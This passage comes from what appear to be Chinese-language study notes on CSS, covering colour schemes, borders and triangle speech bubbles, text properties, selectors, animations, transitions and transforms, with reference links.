Complementary\n使用互補色左右兩邊的顏色來做搭配，提供同程度的對比但更多的顏色組合</li>\n<li>三等色法 Triadic\n色相環上正三角型的三個顏色，組合通常非常顯眼，特別適用三原色或二次顏色時，需小心使用</li>\n<li>矩形配色法 Tetradic\n互用兩組補色做配對，有一為主色時能達到最好效果</li>\n</ul>\n<h4 id=\"易看的色彩\">易看的色彩</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://creator.dwango.co.jp/13693.html\">色による「見やすさ」のデザイン | dwango creators&#39; blog（ドワンゴクリエイターズブログ）</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://tsutawarudesign.com/miyasuku5.html\">伝わるデザイン - 配色</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.jstage.jst.go.jp/article/jcsaj/41/3+/41_163/_pdf\">印刷物の可読性に対する背景色及び年齢・照度の影響</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.webcolordesign.net/color_point/usability/readable_color.html\">視認性・可読性の確保 | 使いやすさを考えた配色 | 基礎からわかるホームページの配色</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://creator-index.com/2015/01/729/\">視認性と可読性 | Creator 　 Index</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.paciellogroup.com/resources/contrastanalyser/\">Colour Contrast Analyser (CCA)</a></li>\n</ul>\n<h4 id=\"網頁安全色\">網頁安全色</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yuma_h/items/13989334fc7a6d016ea5\">Web セーフカラー　カラーコード一覧 - Qiita</a></li>\n</ul>\n<h3 id=\"邊框\">邊框</h3>\n<ul>\n<li><p><code>border: border-width border-style color;</code>\n├ 無強制順序需求\n├ border-width: <code>&lt;length&gt;</code>, <code>thin</code>, <code>medium</code>, <code>thick</code>\n├ border-style: <code>solid</code>, <code>none</code>, <code>hidden</code>, <code>dashed</code>, <code>dotted</code>, <code>double</code>, <code>groove</code>, <code>ridge</code>, <code>inset</code>, <code>outset</code>\n└ color: <code>rgb()</code>, <code>rgba()</code>, <code>hsl()</code>, <code>hsla()</code>, <code>&lt;hex-color&gt;</code>, <code>&lt;named-color&gt;</code>, <code>currentcolor</code></p>\n</li>\n<li><p><code>border</code> 本身具有空間，在使用時須注意計算\n├ 用於動畫時，可以使用如設定初始顏色為透明色，或是設定為 <code>hidden</code> 解決空間問題\n├ 因為四邊 <code>border</code> 會彼此交疊，此特性可用於無長寬的虛擬元素上，製作三角形圖示：\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://design.webclips.jp/css-arrow/\">CSS だけで三角・矢印を作る方法 | webclips</a></p>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">.message-box::after</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 10px solid transparent<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-top-color</span><span class=\"token punctuation\">:</span> #00cc99<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><p>├ 並搭配做出對話框效果：</p>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">.bubble01</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #f39800<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 5px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.bubble01:before</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> 1<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-style</span><span class=\"token punctuation\">:</span> solid<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-color</span><span class=\"token punctuation\">:</span> #f39800 transparent<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* 只有上、右、左有邊框（空間），左右邊框為透明色\n  因此最後會變為尖端朝下的小三角形 */</span>\n  <span class=\"token property\">border-width</span><span class=\"token punctuation\">:</span> 10px 10px 0 10px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> -10px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span> -10px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">.bubble</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #f39800<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 5px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.bubble:before</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> 1<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-style</span><span class=\"token punctuation\">:</span> solid<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-color</span><span class=\"token punctuation\">:</span> #f39800 transparent<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* 只有上、右有邊框（空間），左、下無邊框，右邊框為透明色\n  因此最後會變為直角在左上的等邊三角形 */</span>\n  <span class=\"token property\">border-width</span><span class=\"token punctuation\">:</span> 20px 20px 0 0<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> -20px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span> -10px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></li>\n<li><p><code>box-shadow: horizonalOffset verticalOffset blurRadius optionalSpreadRadius color</code></p>\n</li>\n<li><p><code>box-shadow</code> 則不具有空間</p>\n</li>\n</ul>\n<h2 id=\"4-文字\">4. 文字</h2>\n<ol>\n<li><code>color</code>：文字色彩</li>\n<li><code>font-size</code>：字級\n├ 使用 <code>em</code> 時若想簡化換算，可以在 <code>body</code> 指定 <code>font-size: 62.5%;</code>，\n│ 讓 <code>1em = 16px x 62.5% = 10px</code>，這樣 <code>px</code> 數只需要除以 10 就能換算成 <code>em</code>。\n└ 使用 <code>rem</code> 可以避免字體大小逐層複合的連鎖反應，讓所有網頁文字同時等比例縮放。</li>\n<li><code>font-weight</code>：字重</li>\n<li><code>text-align</code>：文字對齊</li>\n<li><code>text-decoration</code>：文字裝飾</li>\n<li><code>text-indent</code>：文字首行縮排</li>\n<li><code>font-family</code>／<code>font-style</code>：字體\n├ <code>sans-serif</code>：英美字體的「無襯線體」，對應到中文的「黑體」。\n├ <code>serif</code>：英美字體的「襯線體」，對應到中文的「明體」。\n├ <code>monospace</code>：等寬字體。常用於程式的原始碼字體。\n├ <code>cursive</code>：手寫風格字體。會依據 OS 與瀏覽器而有大幅差異。\n└ <code>fantasy</code>：裝飾風格字體。同樣會依據 OS 與瀏覽器有大幅差異。</li>\n<li><code>letter-spacing</code>：字距</li>\n<li><code>line-height</code>：行高\n└ 字距用 em，行高用 ex</li>\n<li><code>overflow-wrap: break-word;</code>：換行\n├ <code>word-wrap: break-word;</code>\n├ <code>word-break: break-all;</code>\n└ <code>word-break: break-word;</code></li>\n</ol>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://fonts.google.com/\">Google Font</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/an_apco/items/87ff859950bc2752ae8c\">line-height について考えませんか - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/y___k/items/e663c3d9586861b8aa0d\">vw と rem を組み合わせて、4K ディスプレイを考慮した文字サイズを設計する - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/vhs-design-vitamin-for-creative-mind/font-size-4b4817ac17a3\">讓文字配合 RWD 網站自動縮放大小 - VHS—Design vitamin for creative mind. - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.iamtie.com/2020/09/cssarticlesetting.html\">《網頁設計》舒適的中文文章 CSS 排版設定（附加思源黑體注意事項） - iamtie（我是鐵）</a></li>\n</ul>\n<h2 id=\"5-選取器\">5. 選取器</h2>\n<h3 id=\"選取器類別\">選取器類別</h3>\n<ol>\n<li><code>*</code>：全體選擇器 universal selector</li>\n<li><code>div</code>：type 選取器</li>\n<li><code>.chrisClass1</code>：class 選取器</li>\n<li><code>#chrisID</code>：ID 選取器</li>\n<li>attribute 屬性選取器</li>\n<li><code>selector[attritube=vaule]</code>：presence and value selectors 指定屬性選擇器\n├ <code>[attribute~=value]</code> 選定多個以空格隔開的 attribute 其中之一的值為 value 的元素\n└ <code>[attribute|=value]</code> 選定接在 <code>-</code> (U+002D) 或者單獨的 attribute 值為 value 呃元素，常用於選定語言子碼</li>\n<li>substring matching attribute selectors 局部屬性選擇器\n├ <code>[attribute^=&#39;value&#39;]</code> 選定 attribute 值以 value 開頭／前綴的元素\n├ <code>[attribute$=&#39;value&#39;]</code> 選定 attribute 值以 value 結尾／後綴的元素\n└ <code>[attribute*=&#39;value&#39;]</code> 選定 attribute 值中包含 value 的元素</li>\n<li>psuedo-class 選取器 <code>:</code>\n├ 同樣屬於 class 的一種\n├ 可說是 CSS 本身提供的分類\n└ 優先權同 class</li>\n</ol>\n<h4 id=\"psuedo-class-選取器\">psuedo-class 選取器</h4>\n<ul>\n<li>錨點虛擬類別\n├ <code>:link</code>：尚未點擊\n├ <code>:hover</code>：滑鼠碰觸\n├ <code>:active</code>：點擊當下\n├ <code>:focus</code>：取得焦點\n├ <code>:visited</code>：點擊過後\n│ 由於虛擬類別的優先權同於 class\n│ 會遇到後者覆寫前者的規則問題\n│ 在撰寫順序上需注意應為：\n├ 1. <code>a</code>\n│ 2. <code>a: visited</code>\n│ 3. <code>a: hover</code>\n└ 4. <code>a: active</code></li>\n<li>狀態虛擬類別\n├ <code>:checked</code>\n├ <code>:unchecked</code>\n├ <code>:enabled</code>\n└ <code>:disabled</code></li>\n<li>序列虛擬類別\n├ <code>:empty</code>\n└ <code>:not()</code></li>\n<li><code>*-child</code>\n├ <code>:first-child</code>：第一個子元素\n├ <code>:last-child</code>：最後一個子元素\n├ <code>:nth-child(數字)</code>：第幾個子元素（從 1 數起，不是從 0）\n├ <code>:nth-child(2n)</code>：偶數的子元素（2 的倍數）\n├ <code>:nth-child(2n+1)</code>：奇數的子元素\n├ <code>:nth-last-child(數字)</code>：從後面數來第幾個子元素\n└ <code>:only-child</code>：父元素內只有一個子元素</li>\n<li><code>*-of-type</code>\n├ <code>:first-of-type</code>：同一種元素的第一個\n├ <code>:last-of-type</code>：同一種元素的最後一個\n├ <code>:nth-of-type(數字)</code>：同一種元素裏頭的第幾個\n├ <code>:nth-last-of-type(數字)</code>：同一種元素從後面屬過來第幾個\n└ <code>:only-of-type</code>：只有這種元素</li>\n</ul>\n<ol start=\"9\">\n<li><code>::</code>：psuedo-element 選取器</li>\n</ol>\n<ul>\n<li>應用於裝飾性的物件上</li>\n<li><code>:: before（:before）</code>\n在原本的元素「之前」加入內容，以 <code>display: inline-block</code> 的屬性存在</li>\n<li><code>:: after（:after）</code>\n在原本的元素「之後」加入內容，以 <code>display: inline-block</code> 的屬性存在</li>\n<li><code>:: before（:before）</code> 與 <code>:: after（:after）</code> 一定要有 <code>content</code> 的屬性</li>\n<li><code>content</code> 屬性可使用的值有：\n├ <code>none</code>\n├ <code>normal</code>\n├ <code>string</code>\n├ <code>url</code>\n├ <code>counter</code>\n├ <code>attr</code>\n├ <code>open-quote</code>\n├ <code>close-quote</code>\n├ <code>no-open-quote</code>\n└ <code>no-close-quote</code></li>\n</ul>\n<ol start=\"10\">\n<li>其它的偽元素選取器：</li>\n</ol>\n<ul>\n<li><code>::selection</code></li>\n<li><code>::first-line（: first-line）</code></li>\n<li><code>::first-letter（: first-letter）</code></li>\n<li><code>::cue（: cue）</code></li>\n<li><code>::backdrop</code></li>\n<li><code>::placeholder</code></li>\n<li><code>::marker</code></li>\n<li><code>::spelling-error</code></li>\n<li><code>::grammar-error</code></li>\n</ul>\n<ol start=\"11\">\n<li><code>:root</code></li>\n</ol>\n<ul>\n<li>通常用於存放 CSS 變數用</li>\n<li>使用 <code>var(變數名稱)</code> 套用</li>\n<li>變數以 <code>--</code> 開頭命名，ex: <code>--primary-color</code></li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">:root</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">--width</span><span class=\"token punctuation\">:</span> 100vw<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">--max-width</span><span class=\"token punctuation\">:</span> 100vw<span class=\"token punctuation\">;</span>\n\n  <span class=\"token atrule\"><span class=\"token rule\">@media</span> <span class=\"token punctuation\">(</span><span class=\"token property\">min-width</span><span class=\"token punctuation\">:</span> 42em<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">--width</span><span class=\"token punctuation\">:</span> 42rem<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre><h3 id=\"選取器運算子\">選取器運算子</h3>\n<ul>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/nana8/full/aXQgoj\">CSS Selector 速見表</a></p>\n</li>\n<li><p><code>+</code> 選擇緊鄰元素\n├ 也就是第 2 個元素緊接於第 1 個元素之後，並且兩者擁有相同母元素\n├ <code>A + B</code>\n└ 例：<code>h2 + p</code> 會選擇所有緊鄰於 <code>&lt;h2&gt;</code> 之後的 <code>&lt;p&gt;</code></p>\n</li>\n<li><p><code>~</code> 選擇兄弟元素，\n├ 也就是第 2 個元素在第 1 個元素後方任意位置，並且兩者擁有相同母元素\n├ <code>A ~ B</code>\n└ 例：<code>p ~ span</code> 會選擇所有在 <code>&lt;p&gt;</code> 元素之後的 <code>&lt;span&gt;</code>元素</p>\n</li>\n<li><p><code>&gt;</code> 選擇直接子元素\n├ <code>A &gt; B</code>\n└ 例：<code>ul &gt; li</code> 僅會選擇 <code>&lt;ul&gt;</code> 元素巢狀內第一層的 <code>&lt;li&gt;</code> 元素</p>\n</li>\n<li><p><code>\\s</code> 選擇所有子元素\n├ <code>A B</code>\n└ 例：<code>div span</code> 會選擇所有 <code>&lt;div&gt;</code> 內的 <code>&lt;span&gt;</code> 元素</p>\n</li>\n</ul>\n<h2 id=\"6-動畫\">6. 動畫</h2>\n<h3 id=\"animation-動畫\">animation 動畫</h3>\n<p>CSS 的動畫共有 8 個 properties，而其中名稱與總播放時間為必須的，這 8 個 properties 分別為：</p>\n<ol>\n<li><code>animation-name</code>：此動畫的名稱</li>\n<li><code>animation-duration</code>：動畫完整播放所需時間，預設值為 0\n├ 必須大於等於 0，負值無效\n│ 可使用整數或小數點，單位為秒（s）或毫秒（ms）\n├ 根據人類資訊處理模型，人類感知物件平均所需時間為 230ms（0.23s）\n│ 不同人的最短感知到最長感知時間落在 70ms 到 700ms 前後\n├ 簡單且重覆性高的動態效果（如選單），時間過長（如 600ms = 0.6s）會令人有冗長的感覺\n└ 設定在 250ms = 0.25s 前後較能讓人感受到動態，同時不會有等待的感覺</li>\n<li><code>animation-timing-function</code>：動畫的速度曲線，預設值為 ease（起始結束減速，中途加速）\n├ 此曲線為由貝茲曲線（Cubic Bezier）所構成的函數圖型，CSS 有數個預先定義好的值\n├ 如 linear（線性）、ease（起始結束減速，中途加速）、ease-in（漸入）、ease-out（漸出）、ease-in-out（漸入漸出）\n├ 亦可自行定義貝茲曲線的數值：<code>cubic-bezier(n1, n2, n3, n4)</code>，其值需為介於 0 至 1 之間的小數或整數\n├ 實際效果可以參照 <a target=\"_blank\" rel=\"nofollow\" href=\"https://easings.net/\">Easing 函數</a> 或是 <a target=\"_blank\" rel=\"nofollow\" href=\"https://cubic-bezier.com/#.17,.67,.83,.67\">cubic-bezier(.17,.67,.83,.67)</a>\n└ 除了貝茲曲線圖型外，亦可使用 <a target=\"_blank\" rel=\"nofollow\" href=\"http://ghmagical.com/article/0gU2Wefas7hn\"><code>steps()</code></a> 做出跳躍的效果</li>\n<li><code>animation-delay</code>：動畫開始的時間點，預設值為 0\n└ 可設為負值，負值意味動畫立即開始，並且提早結束</li>\n<li><code>animation-iteration-count</code>：動畫播放次數，預設值為 1，可設為 n（正整數）或 infinite</li>\n<li><code>animation-direction</code>：動畫播放順序，預設值為 normal（正向播放）\n├ <code>normal</code>\n├ <code>reverse</code>\n├ <code>alternate</code>：奇數次正向播放，偶數次反向播放\n└ <code>alternate-reverse</code></li>\n<li><code>animation-play-state</code>：動畫播放狀態，預設值為 running（播放）\n├ <code>paused</code>\n└ <code>running</code></li>\n<li><code>animation-fill-mode</code>：動畫播放開始前或結束後的狀態，預設值為 none（回到初始狀態）\n├ <code>none</code>：動畫結束後立即回至開始前的狀態\n├ <code>forwards</code>：動畫結束後保持結束時的狀態\n├ <code>backwards</code>\n└ <code>both</code></li>\n</ol>\n<p>並且可簡寫成 <code>animation: 動畫名稱 播放時長 開始時間點 速度曲線 次數 順序 開始前結束後狀態 播放狀態(播放或是暫停)</code>\n如：<code>animation: rotation 2s ease 0s 1 alternate none running;</code></p>\n<h3 id=\"keyframes\">@keyframes</h3>\n<p><code>animation</code> 只能定義單次的動畫，如果我們想要做出一連串的動畫變化效果，\n也就是所謂的時間軸和關鍵影格時，我們就需要 <code>@keyframes</code> 了\n時間軸有兩種寫法：</p>\n<ol>\n<li><code>from</code> -&gt; <code>n%</code> -&gt; <code>to</code></li>\n<li><code>0%</code> -&gt; <code>n%</code> -&gt; <code>100%</code>\n└ 基本上 <code>from</code> = <code>0%</code>，<code>to</code> = <code>100%</code></li>\n</ol>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">div:hover</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">animation</span><span class=\"token punctuation\">:</span> chloe 2s infinite<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> chloe</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token selector\">0%</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token selector\">// 也可以寫成 from</span> <span class=\"token punctuation\">{</span>...<span class=\"token punctuation\">}</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token selector\">100%</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token selector\">// 也可以寫成 to</span> <span class=\"token punctuation\">{</span>...<span class=\"token punctuation\">}</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 0%<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre><p>亦可透過 Chrome DevTools 調整，要注意的是在 <code>@keyframes</code> 裡面寫 <code>!important</code> 是沒有效果的。</p>\n<h4 id=\"參考文章\">參考文章</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oxxostudio.tw/articles/201803/css-animation.html\">完整解析 CSS 動畫 ( CSS Animation )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/soarflat/items/4a302e0cafa21477707f\">CSS アニメーション 入門</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://qiita.com/nekoneko-wanwan/items/e8114c6e34d2950a7b28\">CSS アニメーションを使いこなすために知っておきたい 5 つのこと</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/ja/docs/Tools/Performance/Scenarios/Animating_CSS_properties\">CSS プロパティのアニメーション</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yuki153/items/9aac0e5c8d7230a7bbe2\">CSS アニメーションについて深く知る</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mame_hashbill/items/98118f4e7721a1ac30c9\">[CSS アニメーション]三 ( 卍^o^ ) 卍 ← こいつのこれ → 卍を回したい</a></li>\n</ul>\n<h3 id=\"transition-轉場\">transition 轉場</h3>\n<ul>\n<li><code>transition: 屬性 轉換時間 延遲執行動畫的時間 速度;</code>\n└ 預設值為 <code>transition: all 300ms 0s ease;</code></li>\n<li><code>transition-property</code>：指定變動的參數</li>\n<li><code>transition-duration</code>：開始至結束</li>\n<li><code>transition-delay</code>：準備至開始</li>\n<li><code>transition-timing-function</code>：指定 Easing</li>\n</ul>\n<h3 id=\"transform\">transform</h3>\n<ul>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/7968/items/eddfeb4b424d7c2d2d34\">【CSS3】 Transform ( 変形 ) 関連のまとめ - Qiita</a></p>\n</li>\n<li><p><code>transform</code> 可以用來移動、旋轉、縮放或傾斜元素</p>\n</li>\n<li><p>與 <code>transition</code> 或 <code>@keyframes</code> 一同使用可做出互動動畫效果</p>\n</li>\n<li><p>想同時套用多個效果時，使用空格連接即可\n├ <code>transform: translateX(20px) translateY(20px) rotate(30deg);</code>\n├ 套用的順序亦會互相影響，例如先套用傾斜和套用傾斜可能會有不同結果\n└ 若個別記述多個 <code>transform</code> 時，只有最後一個會有效果</p>\n</li>\n<li><p><code>translate</code>：移動\n├ <code>translate(X軸移動距離, Y軸移動距離)</code>\n├ <code>translateX(X軸移動距離)</code>\n├ <code>translateY(Y軸移動距離)</code>\n├ <code>translateZ(Z軸移動距離)</code>\n├ <code>translate3d(X軸移動距離, Y軸移動距離, Z軸移動距離)</code></p>\n</li>\n<li><p><code>rotate</code>：旋轉，使用 <code>deg</code> 單位\n├ <code>rotate(旋轉角度)</code>\n├ <code>rotateX(X軸旋轉角度)</code>\n├ <code>rotateY(Y軸旋轉角度)</code>\n├ <code>rotateZ(Z軸旋轉角度)</code>\n└ <code>rotate3d(X軸旋轉向量, Y軸旋轉向量, Z軸旋轉向量, 旋轉角度)</code></p>\n</li>\n<li><p><code>scale</code>：縮放，以 <code>1</code> 為比例基準\n├ <code>scale(數值, 數值)</code>\n├ <code>scaleX(數值)</code>\n├ <code>scaleY(數值)</code>\n├ <code>scaleZ(數值)</code>\n└ <code>scale3d(數值, 數值, 數值)</code></p>\n</li>\n<li><p><code>skew</code>：傾斜，使用 <code>deg</code> 單位\n├ <code>skew(X軸傾斜角度, Y軸傾斜角度)</code>\n├ <code>skewX(X軸傾斜角度)</code>\n├ <code>skewY(Y軸傾斜角度)</code>\n├ 由於計算方式的關係，<code>skew</code> 的順序不同會出現不同結果\n├ 範例：使用 <code>skew()</code> 做出斜邊效果</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>emphasis-skew-border<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  Content here\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span> <span class=\"token punctuation\">/></span></span>content here <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span> <span class=\"token punctuation\">/></span></span>content here\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">.emphasis-skew-border</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 160px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 10px 20px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 20px<span class=\"token punctuation\">;</span>\n\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #2e8def<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #333333<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> 3px solid #2e8def<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.emphasis-skew-border:after</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> -1<span class=\"token punctuation\">;</span>\n\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #333333<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> 3px solid #2e8def<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-right</span><span class=\"token punctuation\">:</span> 20px solid #2e8def<span class=\"token punctuation\">;</span>\n\n  <span class=\"token property\">transform-origin</span><span class=\"token punctuation\">:</span> bottom left<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-ms-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>-30deg<span class=\"token punctuation\">,</span> 0deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>-30deg<span class=\"token punctuation\">,</span> 0deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>-30deg<span class=\"token punctuation\">,</span> 0deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><p>└ 想得出相同結果，建議改用 <code>matrix()</code></p>\n</li>\n<li><p><code>matrix</code>：結合上述四種變形的記述方式，亦是這幾種變形的實際實作方式\n├ 使用 6 個參數的矩陣，進行轉換計算（即矩陣乘法），<code>Matrix = translate * rotate * scale * skew</code>\n├ <code>matrix(a, b, c, d, e, f)</code>\n├ 從數學上的記述是這樣的：</p>\n<pre class=\"language-\"><code class=\"language-\">a c e       x     a*x + c*y + e\nb d f   *   y  =  b*x + d*y + f\n0 0 1       1      0  +  0  + 1</code></pre><p>│ 轉換後的水平位置：<code>x(prevCoordSys) = ax + 